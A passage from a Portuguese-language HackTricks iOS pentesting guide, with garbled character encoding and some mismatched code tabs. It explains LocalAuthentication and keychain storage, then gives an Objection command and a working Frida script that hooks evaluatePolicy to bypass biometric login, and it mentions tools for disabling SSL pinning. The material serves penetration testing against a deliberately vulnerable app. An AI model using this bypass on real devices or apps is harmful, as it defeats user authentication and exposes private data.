* `deviceOwnerAuthentication`(Swift) ou `LAPolicyDeviceOwnerAuthentication`(Objective-C): Quando dispon√≠vel, o usu√°rio √© solicitado a realizar a autentica√ß√£o do Touch ID. Se o Touch ID n√£o estiver ativado, o c√≥digo de acesso do dispositivo √© solicitado. Se o c√≥digo de acesso do dispositivo n√£o estiver habilitado, a avalia√ß√£o da pol√≠tica falha.
* `deviceOwnerAuthenticationWithBiometrics` (Swift) ou `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C): A autentica√ß√£o √© restrita a biometria, onde o usu√°rio √© solicitado a usar o Touch ID.

A fun√ß√£o **`evaluatePolicy` retorna um valor booleano** indicando se o usu√°rio foi autenticado com sucesso. Isso significa que pode ser facilmente contornado (veja abaixo)

### Autentica√ß√£o Local usando o Keychain

As APIs do **keychain do iOS podem (e devem) ser usadas para implementar a autentica√ß√£o local**. Durante esse processo, o aplicativo armazena um token de autentica√ß√£o secreto ou outro dado secreto que identifica o usu√°rio no keychain. Para autenticar em um servi√ßo remoto, o usu√°rio deve desbloquear o keychain usando sua senha ou impress√£o digital para obter os dados secretos.

O keychain permite salvar itens com o atributo especial `SecAccessControl`, que permitir√° o acesso ao item apenas ap√≥s o usu√°rio passar pela autentica√ß√£o do Touch ID (ou c√≥digo de acesso, se tal fallback for permitido pelos par√¢metros do atributo).

No exemplo a seguir, vamos salvar a string "test\_strong\_password" no keychain. A string s√≥ pode ser acessada no dispositivo atual enquanto o c√≥digo de acesso estiver definido (par√¢metro `kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly`) e ap√≥s a autentica√ß√£o do Touch ID para as impress√µes digitais atualmente registradas (par√¢metro `SecAccessControlCreateFlags.biometryCurrentSet`):

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
{% tab title="Swift" %}

Agora podemos solicitar o item salvo no keychain. Os servi√ßos do keychain apresentar√£o a caixa de di√°logo de autentica√ß√£o ao usu√°rio e retornar√£o os dados ou nil, dependendo se uma impress√£o digital adequada foi fornecida ou n√£o.

```swift
let query: [String: Any] = [
    kSecClass as String: kSecClassGenericPassword,
    kSecAttrService as String: "MyApp",
    kSecAttrAccount as String: "username",
    kSecReturnData as String: true
]

var item: CFTypeRef?
let status = SecItemCopyMatching(query as CFDictionary, &item)

if status == errSecSuccess {
    let passwordData = item as! Data
    let password = String(data: passwordData, encoding: .utf8)
    print("Password: \(password ?? "")")
} else {
    print("Failed to retrieve password: \(status)")
}
```

{% endtab %}
{% endtabs %}
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Detec√ß√£o

O uso de frameworks em um aplicativo tamb√©m pode ser detectado analisando a lista de bibliotecas din√¢micas compartilhadas do bin√°rio do aplicativo. Isso pode ser feito usando o `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Se o `LocalAuthentication.framework` for usado em um aplicativo, a sa√≠da conter√° ambas as seguintes linhas (lembre-se de que o `LocalAuthentication.framework` usa o `Security.framework` por baixo dos panos):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
Se for usado o `Security.framework`, apenas o segundo ser√° mostrado.

### Bypass do Framework de Autentica√ß√£o Local

#### Obje√ß√£o

[**Bypass de Biometria do Obje√ß√£o**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) pode ser usado para contornar a autentica√ß√£o local. O Obje√ß√£o **usa o Frida para instrumentar a fun√ß√£o `evaluatePolicy` para que ela retorne `True`** mesmo que a autentica√ß√£o n√£o tenha sido realizada com sucesso. Use o comando `ios ui biometrics_bypass` para contornar a autentica√ß√£o biom√©trica insegura. O Obje√ß√£o registrar√° um trabalho, que substituir√° o resultado do `evaluatePolicy`. Isso funcionar√° tanto em implementa√ß√µes Swift quanto Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Se vulner√°vel, o m√≥dulo automaticamente ir√° contornar o formul√°rio de login.

#### Frida

Um exemplo de uso do **`evaluatePolicy`** do aplicativo [DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para contornar a Autentica√ß√£o Local, precisamos escrever um script Frida que **contorne** a verifica√ß√£o mencionada do _**evaluatePolicy**. Como voc√™ pode ver no trecho de c√≥digo acima, o **evaluatePolicy** usa um **callback** que determina o **resultado**. Portanto, a maneira mais f√°cil de realizar o hack √© interceptar esse callback e garantir que ele sempre retorne o_ **success=1**.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposi√ß√£o de Funcionalidades Sens√≠veis Atrav√©s de IPC

### Manipuladores de URI Personalizados / Deep Links / Esquemas Personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Links Universais

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartilhamento de UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extens√µes de Aplicativos

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializa√ß√£o e Codifica√ß√£o

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunica√ß√£o de Rede

√â importante verificar se n√£o h√° comunica√ß√£o ocorrendo **sem criptografia** e tamb√©m se o aplicativo est√° corretamente **validando o certificado TLS** do servidor.\
Para verificar esses tipos de problemas, voc√™ pode usar um proxy como o **Burp**:

{% content-ref url="burp-configuration-for-ios.md" %}
[burp-configuration-for-ios.md](burp-configuration-for-ios.md)
{% endcontent-ref %}

### Verifica√ß√£o de Nome de Host

Um problema comum na valida√ß√£o do certificado TLS √© verificar se o certificado foi assinado por uma **CA confi√°vel**, mas **n√£o verificar** se **o nome do host** do certificado √© o nome do host sendo acessado.\
Para verificar esse problema usando o Burp, depois de confiar no CA do Burp no iPhone, voc√™ pode **criar um novo certificado com o Burp para um nome de host diferente** e us√°-lo. Se o aplicativo ainda funcionar, ent√£o algo est√° vulner√°vel.

### Pinagem de Certificado

Se um aplicativo estiver usando corretamente a Pinagem SSL, ent√£o o aplicativo s√≥ funcionar√° se o certificado for o esperado. Ao testar um aplicativo, **isso pode ser um problema, pois o Burp servir√° seu pr√≥prio certificado.**\
Para contornar essa prote√ß√£o em um dispositivo com jailbreak, voc√™ pode instalar o aplicativo [**SSL Kill Switch**](https://github.com/nabla-c0d3/ssl-kill-switch2) ou instalar [**Burp Mobile Assistant**](https://portswigger.net/burp/documentation/desktop/mobile/config-ios-device)

Voc√™ tamb√©m pode usar o comando `ios sslpinning disable` do **objection**

## Miscel√¢nea

* Em **`/System/Library`**, voc√™ pode encontrar os frameworks instalados no telefone usados por aplicativos do sistema
* Os aplicativos instalados pelo usu√°rio na App Store est√£o localizados em **`/User/Applications`**
* E o **`/User/Library`** cont√©m dados salvos pelos aplicativos de n√≠vel do usu√°rio
* Voc√™ pode acessar **`/User/Library/Notes/notes.sqlite`** para ler as notas salvas dentro do aplicativo.
* Dentro da pasta de um aplicativo instalado (**`/User/Applications/<APP ID>/`**), voc√™ pode encontrar alguns arquivos interessantes:
* **`iTunesArtwork`**: O √≠cone usado pelo aplicativo
* **`iTunesMetadata.plist`**: Informa√ß√µes do aplicativo usadas na App Store
* **`/Library/*`**: Cont√©m as prefer√™ncias e o cache. Em **`/Library/Cache/Snapshots/*`**, voc√™ pode encontrar o snapshot realizado pelo aplicativo antes de envi√°-lo para o segundo plano.

### Hot Patching/Atualiza√ß√£o For√ßada

Os desenvolvedores podem **corrigir remotamente todas as instala√ß√µes de seu aplicativo instantaneamente** sem precisar enviar o aplicativo novamente para a App Store e esperar at√© que seja aprovado.\
Para esse prop√≥sito, geralmente √© usado o [**JSPatch**](https://github.com/bang590/JSPatch)**.** Mas tamb√©m existem outras op√ß√µes, como [Siren](https://github.com/ArtSabintsev/Siren) e [react-native-appstore-version-checker](https://www.npmjs.com/package/react-native-appstore-version-checker).\
**Esse √© um mecanismo perigoso que pode ser abusado por SDKs maliciosos de terceiros, portanto, √© recomendado verificar qual m√©todo √© usado para atualiza√ß√£o autom√°tica (se houver) e test√°-lo.** Voc√™ pode tentar baixar uma vers√£o anterior do aplicativo para esse prop√≥sito.

### Terceiros

Um problema dos SDKs de terceiros √© que n√£o h√° **controle granular sobre as funcionalidades oferecidas pelo SDK**. Voc√™ pode usar o SDK e ter todas as funcionalidades (incluindo vazamentos de diagn√≥stico e conex√µes HTTP inseguras), ou n√£o us√°-lo. Al√©m disso, geralmente n√£o √© poss√≠vel para os desenvolvedores de aplicativos **corrigir uma vulnerabilidade** no SDK.\
Al√©m disso, alguns SDKs come√ßam a **conter malware quando s√£o muito confi√°veis** pela comunidade.

Al√©m disso, os servi√ßos fornecidos por esses SDKs podem envolver **servi√ßos de rastreamento para monitorar o comportamento do usu√°rio** ao usar o aplicativo, vender an√∫ncios em banner ou melhorar a experi√™ncia do usu√°rio. A desvantagem dos servi√ßos de terceiros √© que os desenvolvedores n√£o conhecem os detalhes do c√≥digo executado por meio de bibliotecas de terceiros. Consequentemente, n√£o deve ser enviado mais informa√ß√µes do que o necess√°rio para um servi√ßo e nenhuma informa√ß√£o sens√≠vel deve ser divulgada.

A desvantagem √© que um **desenvolvedor n√£o sabe em detalhes qual c√≥digo √© executado por meio de bibliotecas de terceiros** e, portanto, abre m√£o da visibilidade. Consequentemente, deve-se garantir que n√£o mais informa√ß√µes do que o necess√°rio sejam enviadas para o servi√ßo e que nenhuma informa√ß√£o sens√≠vel seja divulgada.

A maioria dos servi√ßos de terceiros √© implementada de duas maneiras:

* com uma biblioteca independente
* com um SDK completo

Todos os dados enviados para servi√ßos de terceiros devem ser anonimizados para evitar a exposi√ß√£o de PII (Informa√ß√µes de Identifica√ß√£o Pessoal) que permitiria que a terceira parte identificasse a conta do usu√°rio.

Voc√™ pode encontrar as **bibliotecas usadas por um aplicativo** executando o comando **`otool`** no aplicativo (e **executando** o comando **em cada** biblioteca **compartilhada** para encontrar mais bibliotecas compartilhadas usadas).

## **Refer√™ncias**

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
## Mais Informa√ß√µes

* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de IOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Vers√£o Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Vers√£o Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

![](../.gitbook/assets/image%20\(9\)%20\(1\)%20\(2\).png)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** com as ferramentas comunit√°rias mais avan√ßadas do mundo.\
Acesse hoje mesmo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
